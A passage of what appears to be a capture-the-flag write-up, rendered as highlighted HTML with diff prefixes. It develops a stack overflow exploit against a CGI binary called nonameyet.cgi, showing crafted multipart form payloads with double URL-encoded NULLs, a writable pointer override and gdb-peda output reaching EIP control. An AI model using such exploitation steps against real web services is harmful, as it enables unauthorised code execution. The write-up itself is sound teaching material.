+   <span class='mh'>0x804cfa9</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>eax</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebp</span><span class='o'>-</span><span class='mh'>0x18</span><span class='o'>]</span>
+   <span class='mh'>0x804cfac</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebx</span><span class='o'>+</span><span class='mh'>0x4</span><span class='o'>],</span><span class='n'>eax</span>
+ <span class='o'>[------------------------------------------------------------------------------]</span>
+<span class='n'>Stopped</span> <span class='nl'>reason:</span> <span class='n'>SIGSEGV</span>
+<span class='mh'>0x0804cfa2</span> <span class='n'>in</span> <span class='o'>??</span> <span class='o'>()</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span>
+</code></pre></div>
+<p>We can go back to our input file and replace the “FFGG” with NULLS so that no copy is executed. My first attempt was to inject raw NULL bytes into this file. I ran the following python script to get the job done. It’s not pretty, but it worked. I could also have used vi with %!xxd and %!xxd –r or any other hex editor to makes these changes.</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>python</span>
+<span class='n'>Python</span> <span class='mf'>2.7</span><span class='o'>.</span><span class='mi'>5</span><span class='o'>+</span> <span class='o'>(</span><span class='k'>default</span><span class='o'>,</span> <span class='n'>Feb</span> <span class='mi'>27</span> <span class='mi'>2014</span><span class='o'>,</span> <span class='mi'>19</span><span class='o'>:</span><span class='mi'>39</span><span class='o'>:</span><span class='mi'>55</span><span class='o'>)</span>
+<span class='o'>[</span><span class='n'>GCC</span> <span class='mf'>4.8</span><span class='o'>.</span><span class='mi'>1</span><span class='o'>]</span> <span class='n'>on</span> <span class='n'>linux2</span>
+<span class='n'>Type</span> <span class='s'>&quot;help&quot;</span><span class='o'>,</span> <span class='s'>&quot;copyright&quot;</span><span class='o'>,</span> <span class='s'>&quot;credits&quot;</span> <span class='n'>or</span> <span class='s'>&quot;license&quot;</span> <span class='k'>for</span> <span class='n'>more</span> <span class='n'>information</span><span class='o'>.</span>
+<span class='o'>&gt;&gt;&gt;</span> <span class='n'>a</span><span class='o'>=</span><span class='n'>open</span><span class='o'>(</span><span class='s'>&quot;formdata&quot;</span><span class='o'>,</span><span class='s'>&quot;rb&quot;</span><span class='o'>)</span>
+<span class='o'>&gt;&gt;&gt;</span> <span class='n'>t</span><span class='o'>=</span><span class='n'>a</span><span class='o'>.</span><span class='na'>read</span><span class='o'>()</span>
+<span class='o'>&gt;&gt;&gt;</span> <span class='n'>t</span><span class='o'>.</span><span class='na'>find</span><span class='o'>(</span><span class='s'>&quot;FFGG&quot;</span><span class='o'>)</span>
+<span class='mi'>286</span>
+<span class='o'>&gt;&gt;&gt;</span> <span class='n'>l</span><span class='o'>=</span><span class='n'>t</span><span class='o'>.</span><span class='na'>find</span><span class='o'>(</span><span class='s'>&quot;FFGG&quot;</span><span class='o'>)</span>
+<span class='o'>&gt;&gt;&gt;</span> <span class='n'>t</span><span class='o'>[</span><span class='nl'>l:</span><span class='n'>l</span><span class='o'>+</span><span class='mi'>4</span><span class='o'>]</span>
+<span class='err'>&#39;</span><span class='n'>FFGG</span><span class='err'>&#39;</span>
+<span class='o'>&gt;&gt;&gt;</span> <span class='n'>def</span> <span class='n'>strow</span><span class='o'>(</span><span class='n'>instr</span><span class='o'>,</span> <span class='n'>owstr</span><span class='o'>,</span> <span class='n'>offset</span><span class='o'>):</span>
+<span class='o'>...</span>   <span class='k'>return</span> <span class='n'>instr</span><span class='o'>[:</span><span class='n'>offset</span><span class='o'>]</span> <span class='o'>+</span> <span class='n'>owstr</span> <span class='o'>+</span> <span class='n'>instr</span><span class='o'>[</span><span class='n'>offset</span><span class='o'>+</span><span class='n'>len</span><span class='o'>(</span><span class='n'>owstr</span><span class='o'>):]</span>
+<span class='o'>...</span>
+<span class='o'>&gt;&gt;&gt;</span> <span class='n'>p</span><span class='o'>=</span><span class='n'>strow</span><span class='o'>(</span><span class='n'>t</span><span class='o'>,</span> <span class='s'>&quot;\0\0\0\0&quot;</span><span class='o'>,</span> <span class='mi'>286</span><span class='o'>)</span>
+<span class='o'>&gt;&gt;&gt;</span> <span class='n'>y</span><span class='o'>=</span><span class='n'>open</span><span class='o'>(</span><span class='s'>&quot;file2&quot;</span><span class='o'>,</span><span class='s'>&quot;wb&quot;</span><span class='o'>)</span>
+<span class='o'>&gt;&gt;&gt;</span> <span class='n'>y</span><span class='o'>.</span><span class='na'>write</span><span class='o'>(</span><span class='n'>p</span><span class='o'>)</span>
+<span class='o'>&gt;&gt;&gt;</span> <span class='n'>y</span><span class='o'>.</span><span class='na'>close</span><span class='o'>()</span>
+</code></pre></div>
+<p>While the python script properly modified the file, this technique did not work. ECX, instead of NULL, was set to 0x2d2d2d2d or “—-“. This value is coming from our boundary on the multipart data. I assumed that because we used NULL bytes that they must be causing early termination of string parsing routines. What if we URL encode the NULL bytes?</p>
+
+<p>Setting the time variable to “AAAABBBBCCCCDDDDEEEEFF%00%00%00%00GGHHHHIIII” and debugging once again yields:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>gdb</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='n'>Reading</span> <span class='n'>symbols</span> <span class='n'>from</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span><span class='o'>...(</span><span class='n'>no</span> <span class='n'>debugging</span> <span class='n'>symbols</span> <span class='n'>found</span><span class='o'>)...</span><span class='na'>done</span><span class='o'>.</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>set</span> <span class='n'>args</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>r</span>
+<span class='n'>Starting</span> <span class='nl'>program:</span> <span class='o'>/</span><span class='n'>home</span><span class='o'>/</span><span class='n'>bool</span><span class='o'>/</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>type:</span> <span class='n'>text</span><span class='o'>/</span><span class='n'>html</span>
+<span class='nl'>Cookie:</span> <span class='n'>AA</span><span class='o'>==</span>
+
+<span class='o'>&lt;</span><span class='n'>p</span><span class='o'>&gt;</span><span class='nl'>ERROR:</span> <span class='mi'>906</span><span class='o'>&lt;/</span><span class='n'>p</span><span class='o'>&gt;&lt;</span><span class='n'>meta</span> <span class='n'>http</span><span class='o'>-</span><span class='n'>equiv</span><span class='o'>=</span><span class='err'>&#39;</span><span class='n'>refresh</span><span class='err'>&#39;</span> <span class='n'>content</span><span class='o'>=</span><span class='err'>&#39;</span><span class='mi'>0</span><span class='o'>;</span><span class='n'>url</span><span class='o'>=../</span><span class='n'>thanks</span><span class='o'>.</span><span class='na'>php</span><span class='err'>&#39;</span><span class='o'>&gt;[</span><span class='n'>Inferior</span> <span class='mi'>1</span> <span class='o'>(</span><span class='n'>process</span> <span class='mi'>1834</span><span class='o'>)</span> <span class='n'>exited</span> <span class='n'>normally</span><span class='o'>]</span>
+<span class='nl'>Warning:</span> <span class='n'>not</span> <span class='n'>running</span> <span class='n'>or</span> <span class='n'>target</span> <span class='n'>is</span> <span class='n'>remote</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span>
+</code></pre></div>
+<p>Well that was a step in the wrong direction! There is no crash now. We are seeing the ERROR: 906 coming back, which is what happens when the photo file being uploaded fails to open. The cookie coming back to us in the HTTP header is the name of this file. The base64 decoding of “AA==“ is 0x00, so it is understandable that that file did not open. I think we are running into similar issues with the string parsing again. This is as far as I got during the actual CTF.</p>
+
+<p>It was not until afterwards that it was pointed out to me that we can double URL encode the NULL values. If URL encoding once makes 0x00 = %00 then URL encoding twice will be 0x00 = %00 = %25%30%30. With my formdata file now looking like this:</p>
+<div class='highlight'><pre><code class='java'><span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;photo&quot;</span><span class='o'>;</span> <span class='n'>filename</span><span class='o'>=</span><span class='s'>&quot;%25Time%25&quot;</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Type:</span> <span class='n'>application</span><span class='o'>/</span><span class='n'>octet</span><span class='o'>-</span><span class='n'>stream</span>
+
+<span class='n'>file</span> <span class='n'>contents</span>
+
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;time&quot;</span>
+
+<span class='n'>AAAABBBBCCCCDDDDEEEEFF</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='n'>GGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP</span>
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span><span class='err'>—</span>
+</code></pre></div>
+<p>We get a debugger output of:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>gdb</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='n'>Reading</span> <span class='n'>symbols</span> <span class='n'>from</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span><span class='o'>...(</span><span class='n'>no</span> <span class='n'>debugging</span> <span class='n'>symbols</span> <span class='n'>found</span><span class='o'>)...</span><span class='na'>done</span><span class='o'>.</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>set</span> <span class='n'>args</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>r</span>
+<span class='n'>Starting</span> <span class='nl'>program:</span> <span class='o'>/</span><span class='n'>home</span><span class='o'>/</span><span class='n'>bool</span><span class='o'>/</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+
+<span class='n'>Program</span> <span class='n'>received</span> <span class='n'>signal</span> <span class='n'>SIGSEGV</span><span class='o'>,</span> <span class='n'>Segmentation</span> <span class='n'>fault</span><span class='o'>.</span>
+<span class='o'>[----------------------------------</span><span class='n'>registers</span><span class='o'>-----------------------------------]</span>
+<span class='nl'>EAX:</span> <span class='mh'>0xb7fd9000</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>EBX:</span> <span class='mh'>0x4f4f4e4e</span> <span class='o'>(</span><span class='err'>&#39;</span><span class='n'>NNOO</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='nl'>ECX:</span> <span class='mh'>0x0</span>
+<span class='nl'>EDX:</span> <span class='mh'>0x80500a6</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>ESI:</span> <span class='mh'>0x48484747</span> <span class='o'>(</span><span class='err'>&#39;</span><span class='n'>GGHH</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='nl'>EDI:</span> <span class='mh'>0xb7fd9000</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>EBP:</span> <span class='mh'>0xbffff638</span> <span class='o'>(</span><span class='s'>&quot;LLMMMMNNNNOOOOPPPP&quot;</span><span class='o'>)</span>
+<span class='nl'>ESP:</span> <span class='mh'>0xbffff60a</span> <span class='o'>(</span><span class='s'>&quot;AAAABBBBCCCCDDDDEEEEFF&quot;</span><span class='o'>)</span>
+<span class='nl'>EIP:</span> <span class='mh'>0x804cfa7</span> <span class='o'>(</span><span class='n'>mov</span>    <span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebx</span><span class='o'>],</span><span class='n'>eax</span><span class='o'>)</span>
+<span class='nl'>EFLAGS:</span> <span class='mh'>0x10206</span> <span class='o'>(</span><span class='n'>carry</span> <span class='n'>PARITY</span> <span class='n'>adjust</span> <span class='n'>zero</span> <span class='n'>sign</span> <span class='n'>trap</span> <span class='n'>INTERRUPT</span> <span class='n'>direction</span> <span class='n'>overflow</span><span class='o'>)</span>
+<span class='o'>[-------------------------------------</span><span class='n'>code</span><span class='o'>-------------------------------------]</span>
+   <span class='mh'>0x804cf9f</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>ecx</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebp</span><span class='o'>-</span><span class='mh'>0x18</span><span class='o'>]</span>
+   <span class='mh'>0x804cfa2</span><span class='o'>:</span>   <span class='n'>rep</span> <span class='n'>movs</span> <span class='n'>BYTE</span> <span class='n'>PTR</span> <span class='nl'>es:</span><span class='o'>[</span><span class='n'>edi</span><span class='o'>],</span><span class='n'>BYTE</span> <span class='n'>PTR</span> <span class='nl'>ds:</span><span class='o'>[</span><span class='n'>esi</span><span class='o'>]</span>
+   <span class='mh'>0x804cfa4</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>ebx</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebp</span><span class='o'>+</span><span class='mh'>0x8</span><span class='o'>]</span>
+<span class='o'>=&gt;</span> <span class='mh'>0x804cfa7</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebx</span><span class='o'>],</span><span class='n'>eax</span>
+   <span class='mh'>0x804cfa9</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>eax</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebp</span><span class='o'>-</span><span class='mh'>0x18</span><span class='o'>]</span>
+   <span class='mh'>0x804cfac</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebx</span><span class='o'>+</span><span class='mh'>0x4</span><span class='o'>],</span><span class='n'>eax</span>
+   <span class='mh'>0x804cfaf</span><span class='o'>:</span>   <span class='n'>leave</span>
+   <span class='mh'>0x804cfb0</span><span class='o'>:</span>   <span class='n'>ret</span>
+<span class='o'>[------------------------------------</span><span class='n'>stack</span><span class='o'>-------------------------------------]</span>
+<span class='mi'>0000</span><span class='o'>|</span> <span class='mh'>0xbffff60a</span> <span class='o'>(</span><span class='s'>&quot;AAAABBBBCCCCDDDDEEEEFF&quot;</span><span class='o'>)</span>
+<span class='mi'>0004</span><span class='o'>|</span> <span class='mh'>0xbffff60e</span> <span class='o'>(</span><span class='s'>&quot;BBBBCCCCDDDDEEEEFF&quot;</span><span class='o'>)</span>
+<span class='mi'>0008</span><span class='o'>|</span> <span class='mh'>0xbffff612</span> <span class='o'>(</span><span class='s'>&quot;CCCCDDDDEEEEFF&quot;</span><span class='o'>)</span>
+<span class='mi'>0012</span><span class='o'>|</span> <span class='mh'>0xbffff616</span> <span class='o'>(</span><span class='s'>&quot;DDDDEEEEFF&quot;</span><span class='o'>)</span>
+<span class='mi'>0016</span><span class='o'>|</span> <span class='mh'>0xbffff61a</span> <span class='o'>(</span><span class='s'>&quot;EEEEFF&quot;</span><span class='o'>)</span>
+<span class='mi'>0020</span><span class='o'>|</span> <span class='mh'>0xbffff61e</span> <span class='o'>--&gt;</span> <span class='mh'>0x4646</span> <span class='o'>(</span><span class='err'>&#39;</span><span class='n'>FF</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='mi'>0024</span><span class='o'>|</span> <span class='mh'>0xbffff622</span> <span class='o'>--&gt;</span> <span class='mh'>0x47470000</span> <span class='o'>(</span><span class='err'>&#39;&#39;</span><span class='o'>)</span>
+<span class='mi'>0028</span><span class='o'>|</span> <span class='mh'>0xbffff626</span> <span class='o'>(</span><span class='s'>&quot;HHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP&quot;</span><span class='o'>)</span>
+<span class='o'>[------------------------------------------------------------------------------]</span>
+<span class='nl'>Legend:</span> <span class='n'>code</span><span class='o'>,</span> <span class='n'>data</span><span class='o'>,</span> <span class='n'>rodata</span><span class='o'>,</span> <span class='n'>value</span>
+<span class='n'>Stopped</span> <span class='nl'>reason:</span> <span class='n'>SIGSEGV</span>
+<span class='mh'>0x0804cfa7</span> <span class='n'>in</span> <span class='o'>??</span> <span class='o'>()</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span>
+</code></pre></div>
+<p>Awesome, we got past the rep movs with a NULL ECX and we are now 9 bytes away. The crash is now on the instruction 0x804cfa7: mov DWORD PTR [ebx],eax where EBX is 0x4f4f4e4e. We are writing EAX to this pointer. We can set this to be anywhere in memory that is writeable to avoid this crash. At the offset for “NNOO” let’s put in 0x0804F0EC, which is just past the end of the .BSS section. That address is mapped into our memory space and will be NULL and unused throughout the program. We will need to little endian encode and URL encode this pointer resulting in: %EC%F0%04%08.</p>
+
+<p>Now with a formdata file of:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>cat</span> <span class='n'>formdata</span>
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;photo&quot;</span><span class='o'>;</span> <span class='n'>filename</span><span class='o'>=</span><span class='s'>&quot;%25Time%25&quot;</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Type:</span> <span class='n'>application</span><span class='o'>/</span><span class='n'>octet</span><span class='o'>-</span><span class='n'>stream</span>
+
+<span class='n'>file</span> <span class='n'>contents</span>
+
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;time&quot;</span>
+
+<span class='n'>AAAABBBBCCCCDDDDEEEEFF</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='n'>GGHHHHIIIIJJJJKKKKLLLLMMMMNN</span><span class='o'>%</span><span class='n'>EC</span><span class='o'>%</span><span class='n'>F0</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='n'>OOPPPP</span>
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span><span class='err'>—</span>
+</code></pre></div>
+<p>We get a debugger output of:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>gdb</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='n'>Reading</span> <span class='n'>symbols</span> <span class='n'>from</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span><span class='o'>...(</span><span class='n'>no</span> <span class='n'>debugging</span> <span class='n'>symbols</span> <span class='n'>found</span><span class='o'>)...</span><span class='na'>done</span><span class='o'>.</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>set</span> <span class='n'>args</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>r</span>
+<span class='n'>Starting</span> <span class='nl'>program:</span> <span class='o'>/</span><span class='n'>home</span><span class='o'>/</span><span class='n'>bool</span><span class='o'>/</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+
+<span class='n'>Program</span> <span class='n'>received</span> <span class='n'>signal</span> <span class='n'>SIGSEGV</span><span class='o'>,</span> <span class='n'>Segmentation</span> <span class='n'>fault</span><span class='o'>.</span>
+<span class='o'>[----------------------------------</span><span class='n'>registers</span><span class='o'>-----------------------------------]</span>
+<span class='nl'>EAX:</span> <span class='mh'>0x0</span>
+<span class='nl'>EBX:</span> <span class='mh'>0x804f0ec</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7fd9000</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>ECX:</span> <span class='mh'>0x0</span>
+<span class='nl'>EDX:</span> <span class='mh'>0x80500a6</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>ESI:</span> <span class='mh'>0x48484747</span> <span class='o'>(</span><span class='err'>&#39;</span><span class='n'>GGHH</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='nl'>EDI:</span> <span class='mh'>0xb7fd9000</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>EBP:</span> <span class='mh'>0x4d4d4c4c</span> <span class='o'>(</span><span class='err'>&#39;</span><span class='n'>LLMM</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='nl'>ESP:</span> <span class='mh'>0xbffff640</span> <span class='o'>--&gt;</span> <span class='mh'>0x804f0ec</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7fd9000</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>EIP:</span> <span class='mh'>0x4e4e4d4d</span> <span class='o'>(</span><span class='err'>&#39;</span><span class='n'>MMNN</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='nl'>EFLAGS:</span> <span class='mh'>0x10206</span> <span class='o'>(</span><span class='n'>carry</span> <span class='n'>PARITY</span> <span class='n'>adjust</span> <span class='n'>zero</span> <span class='n'>sign</span> <span class='n'>trap</span> <span class='n'>INTERRUPT</span> <span class='n'>direction</span> <span class='n'>overflow</span><span class='o'>)</span>
+<span class='o'>[-------------------------------------</span><span class='n'>code</span><span class='o'>-------------------------------------]</span>
+<span class='n'>Invalid</span> <span class='n'>$PC</span> <span class='nl'>address:</span> <span class='mh'>0x4e4e4d4d</span>
+<span class='o'>[------------------------------------</span><span class='n'>stack</span><span class='o'>-------------------------------------]</span>
+<span class='mi'>0000</span><span class='o'>|</span> <span class='mh'>0xbffff640</span> <span class='o'>--&gt;</span> <span class='mh'>0x804f0ec</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7fd9000</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='mi'>0004</span><span class='o'>|</span> <span class='mh'>0xbffff644</span> <span class='o'>(</span><span class='s'>&quot;OOPPPP&quot;</span><span class='o'>)</span>
+<span class='mi'>0008</span><span class='o'>|</span> <span class='mh'>0xbffff648</span> <span class='o'>--&gt;</span> <span class='mh'>0xff005050</span>
+<span class='mi'>0012</span><span class='o'>|</span> <span class='mh'>0xbffff64c</span> <span class='o'>--&gt;</span> <span class='mh'>0x1</span>
+<span class='mi'>0016</span><span class='o'>|</span> <span class='mh'>0xbffff650</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7e2bb98</span> <span class='o'>--&gt;</span> <span class='mh'>0x2a5c</span> <span class='o'>(</span><span class='err'>&#39;\\</span><span class='o'>*</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='mi'>0020</span><span class='o'>|</span> <span class='mh'>0xbffff654</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7fdc858</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7e1f000</span> <span class='o'>--&gt;</span> <span class='mh'>0x464c457f</span>
+<span class='mi'>0024</span><span class='o'>|</span> <span class='mh'>0xbffff658</span> <span class='o'>--&gt;</span> <span class='mh'>0xbffff866</span> <span class='o'>(</span><span class='s'>&quot;/home/bool/nonameyet.cgi&quot;</span><span class='o'>)</span>
+<span class='mi'>0028</span><span class='o'>|</span> <span class='mh'>0xbffff65c</span> <span class='o'>--&gt;</span> <span class='mh'>0x80500a0</span> <span class='o'>(</span><span class='s'>&quot;%Time%&quot;</span><span class='o'>)</span>
+<span class='o'>[------------------------------------------------------------------------------]</span>
+<span class='nl'>Legend:</span> <span class='n'>code</span><span class='o'>,</span> <span class='n'>data</span><span class='o'>,</span> <span class='n'>rodata</span><span class='o'>,</span> <span class='n'>value</span>
+<span class='n'>Stopped</span> <span class='nl'>reason:</span> <span class='n'>SIGSEGV</span>
+<span class='mh'>0x4e4e4d4d</span> <span class='n'>in</span> <span class='o'>??</span> <span class='o'>()</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span>
+</code></pre></div>
+<p>Excellent! EIP: 0x4e4e4d4d. I can now control the next instruction that this program executes. Our goal is to send EIP back to a buffer that we control. Let’s find everywhere in memory that our input string exists:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>searchmem</span> <span class='n'>AAAABBBB</span>
+<span class='n'>Searching</span> <span class='k'>for</span> <span class='err'>&#39;</span><span class='n'>AAAABBBB</span><span class='err'>&#39;</span> <span class='nl'>in:</span> <span class='n'>None</span> <span class='n'>ranges</span>
+<span class='n'>Found</span> <span class='mi'>3</span> <span class='n'>results</span><span class='o'>,</span> <span class='n'>display</span> <span class='n'>max</span> <span class='mi'>3</span> <span class='nl'>items:</span>
+ <span class='o'>[</span><span class='n'>heap</span><span class='o'>]</span> <span class='o'>:</span> <span class='mh'>0x80501b8</span> <span class='o'>(</span><span class='s'>&quot;AAAABBBBCCCCDDDDEEEEFF&quot;</span><span class='o'>)</span>
+ <span class='n'>mapped</span> <span class='o'>:</span> <span class='mh'>0xb7fda108</span> <span class='o'>(</span><span class='s'>&quot;AAAABBBBCCCCDDDDEEEEFF%25%30%30%25%30%30%25%30%30%25%30%30GGHHHHIIIIJJJJKKKKLLLLMMMMNN%EC%F0%04%08OOPPPP\r\n&quot;</span><span class='o'>,</span> <span class='sc'>&#39;-&#39;</span> <span class='o'>&lt;</span><span class='n'>repeats</span> <span class='mi'>29</span> <span class='n'>times</span><span class='o'>&gt;,</span> <span class='s'>&quot;13141138687192--\r\n&quot;</span><span class='o'>)</span> 
+<span class='o'>[</span><span class='n'>stack</span><span class='o'>]</span> <span class='o'>:</span> <span class='mh'>0xbffff60a</span> <span class='o'>(</span><span class='s'>&quot;AAAABBBBCCCCDDDDEEEEFF&quot;</span><span class='o'>)</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>vmmap</span>
+<span class='n'>Start</span>      <span class='n'>End</span>        <span class='n'>Perm</span>      <span class='n'>Name</span>
+<span class='mh'>0x08048000</span> <span class='mh'>0x0804e000</span> <span class='n'>r</span><span class='o'>-</span><span class='n'>xp</span>      <span class='o'>/</span><span class='n'>home</span><span class='o'>/</span><span class='n'>bool</span><span class='o'>/</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='mh'>0x0804e000</span> <span class='mh'>0x0804f000</span> <span class='n'>r</span><span class='o'>-</span><span class='n'>xp</span>      <span class='o'>/</span><span class='n'>home</span><span class='o'>/</span><span class='n'>bool</span><span class='o'>/</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='mh'>0x0804f000</span> <span class='mh'>0x08050000</span> <span class='n'>rwxp</span>      <span class='o'>/</span><span class='n'>home</span><span class='o'>/</span><span class='n'>bool</span><span class='o'>/</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='mh'>0x08050000</span> <span class='mh'>0x08071000</span> <span class='n'>rwxp</span>      <span class='o'>[</span><span class='n'>heap</span><span class='o'>]</span>
+<span class='mh'>0xb7e1e000</span> <span class='mh'>0xb7e1f000</span> <span class='n'>rwxp</span>      <span class='n'>mapped</span>
+<span class='mh'>0xb7e1f000</span> <span class='mh'>0xb7fcd000</span> <span class='n'>r</span><span class='o'>-</span><span class='n'>xp</span>      <span class='o'>/</span><span class='n'>lib</span><span class='o'>/</span><span class='n'>i386</span><span class='o'>-</span><span class='n'>linux</span><span class='o'>-</span><span class='n'>gnu</span><span class='o'>/</span><span class='n'>libc</span><span class='o'>-</span><span class='mf'>2.17</span><span class='o'>.</span><span class='na'>so</span>
